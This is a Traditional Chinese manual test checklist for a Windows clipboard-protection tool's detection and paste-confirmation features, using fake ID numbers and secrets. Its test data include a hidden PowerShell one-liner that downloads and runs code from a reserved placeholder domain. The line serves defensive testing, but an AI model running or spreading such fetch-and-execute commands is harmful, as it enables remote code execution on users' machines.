# Windows 手動測試清單（Phase 4）

`docs/plan/phase-4.md` §4.7 的完成條件之一是「Windows 手動測試清單全部通過」。這份文件把散在 §4.6、§4.8.4、§4.7 和 `docs/spec/detection-rules.md` §4、§5.3 的手動項目整理在一起。每一項都寫了步驟、預期結果和對應的規格。

測完把結果填進最後的「結果紀錄」，貼到 #43。失敗的項目附上截圖和當下的系統匣 tooltip。

### 測試資料（只用假資料）

- **假身分證字號**：`A123456789`。檢查碼正確，但不是真人。
- **登記用的假機密**：`pw-manual-secret-7Q2x`。到系統匣「登記機密…」登記，標籤取 `測試機密`。
- **惡意指令樣本**：Defender 會隔離完整的樣本，所以這份文件不寫完整指令。要用時打開記事本，**分兩次打**：先打 `power`，再緊接著打 `shell -w hidden -c "iex(iwr 'https://example.invalid/a')"`，全選後複製。網址是保留網域，不會連到任何地方。
- **一般指令**：`git status`，用來確認不會誤報。

> ⚠️ 不論在哪個視窗，貼上惡意指令樣本後都**不要按 Enter**。保護正常的話根本貼不出東西；如果貼出來了，就是測試失敗，記下來後清掉那一行。

## B. 複製時的偵測與通知

| # | 步驟 | 預期 | 規格 |
|---|---|---|---|

| B3 | 複製 `A123456789` | 跳「剪貼簿裡有機密資料」，內容顯示遮罩版（例如 `A12****789`），**不會出現完整號碼** | §5、P4 |

## D. 貼上前確認（嚴格模式）

先登記假機密 `pw-manual-secret-7Q2x`。系統匣的「攔截已登記的機密」預設是勾選的。

| # | 步驟 | 預期 | 規格 |
|---|---|---|---|
| D1 | 複製假機密，到記事本按 Ctrl+V | 沒有貼出東西，跳出置頂的確認框，而且確認框搶到焦點 | §5.3 |
| D2 | 在確認框按 Enter，再試一次按 Esc | 兩種都是取消：什麼都沒貼，剪貼簿不變 | §5.3 |
| D3 | 用 Tab 把焦點移到每一個按鈕上，各按一次 Enter | 不管焦點在哪個按鈕上，Enter 都是取消；確認框下方寫著「按 Enter 或 Esc 會取消，什麼都不貼。」 | §4.5 確認框的 Enter |
| D4 | 點「貼遮罩版」 | 記事本出現 `********`；約 1 秒後剪貼簿換回原文（到別處貼上確認） | §5.3 |
| D5 | 點「貼原文」；另一次改成用 Tab 把焦點移到它上面再按 Space | 兩種都會在記事本貼出原文 | §4.5 |
| D6 | 開著確認框不動，等 60 秒 | 自動取消，焦點回到記事本 | §5.3 |
| D7 | 確認框開著時，在記事本按 Enter | 這個 Enter 被吞掉；同時其他程式的 Enter 照常可以用 | §5.3 |
| D8 | 用 Shift+Insert、Ctrl+Shift+V 各試一次 D1 | 都會被攔 | §4.3 `PASTE_COMBOS` |
| D9 | 把 `notepad.exe` 加進允許清單，再做一次 D1 | 直接貼出原文，不跳確認框；移出允許清單後恢復攔截 | §5.3 |
| D10 | 取消「攔截已登記的機密」後再做 D1 | 直接貼出；重新勾選後恢復 | §5.3 |
| D11 | 勾選「也攔截個資與 API key」，複製 `A123456789` 後在記事本貼上 | 跳確認框；取消勾選後就不攔 | §5.3 |
